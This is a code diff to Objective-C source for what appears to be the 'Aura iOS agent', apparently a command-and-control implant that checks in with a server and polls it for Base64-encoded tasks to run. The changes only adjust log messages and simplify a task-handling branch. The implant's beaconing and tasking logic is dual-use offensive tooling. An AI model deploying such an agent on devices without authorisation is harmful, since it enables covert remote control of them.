@@ -57,7 +57,7 @@ NSString *callbackUUID = nil;
     };
 
     /// Log what we're going to check-in
-    NSLog(@"[DEBUG] Check-in Data:\n%@", checkinData);
+    NSLog(@"# 👋 Hello from the Aura iOS agent!\n%@\n\n", checkinData);
 
     NSError *jsonError;
     NSData *jsonData = [NSJSONSerialization dataWithJSONObject:checkinData options:0 error:&jsonError];
@@ -224,7 +224,7 @@ NSString *callbackUUID = nil;
     // Add headers from configuration
     for (NSString *key in headers) {
         [request addValue:headers[key] forHTTPHeaderField:key];
-        NSLog(@"[DEBUG] Adding header: %@ = %@", key, headers[key]);
+        // NSLog(@"[DEBUG] Adding header: %@ = %@", key, headers[key]);
     }
 
     NSURLSession *session = [NSURLSession sharedSession];
@@ -232,11 +232,10 @@ NSString *callbackUUID = nil;
 
     NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
         if (error) {
-            NSLog(@"[ERROR] Error during get_tasking: %@", error.localizedDescription);
+            NSLog(@"[ERROR] ❌ Error during get_tasking: %@", error.localizedDescription);
         } else {
             NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
             if (httpResponse.statusCode == 200) {
-                NSLog(@"[DEBUG] Successfully fetched tasking.");
                 if (data) {
                     NSString *responseString = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                     NSLog(@"[DEBUG] Received tasking (Base64): %@", responseString);
@@ -244,7 +243,7 @@ NSString *callbackUUID = nil;
                     // Decode the Base64 response
                     NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:responseString options:0];
                     if (!decodedData) {
-                        NSLog(@"[ERROR] Failed to decode Base64 tasking response.");
+                        NSLog(@"[ERROR] ❌ Failed to decode Base64 tasking response.");
                         return;
                     }
 
@@ -268,16 +267,11 @@ NSString *callbackUUID = nil;
                             NSString *action = taskingResponse[@"action"];
                             NSArray *tasks = taskingResponse[@"tasks"];
                             if ([action isEqualToString:@"get_tasking"] && tasks.count > 0) {
-                                NSLog(@"[DEBUG] Tasks received: %@", tasks);
                                 NSArray *tasksArray = taskingResponse[@"tasks"];
-                                if (tasksArray.count > 0) {
-                                    NSLog(@"[DEBUG] Tasks received: %@", tasksArray);
-                                    [self processTasksFromResponse:taskingResponse];
-                                } else {
-                                    NSLog(@"[DEBUG] No tasks or action mismatch.");
-}
+                                NSLog(@"[DEBUG] 📋 Tasks received: %@", tasksArray);
+                                [self processTasksFromResponse:taskingResponse];
                             } else {
-                                NSLog(@"[DEBUG] No tasks or action mismatch.");
+                                NSLog(@"[DEBUG] ⌚️ Waiting on tasking...");
                             }
                         } else {
                             NSLog(@"[ERROR] Failed to parse JSON from decoded tasking response.");
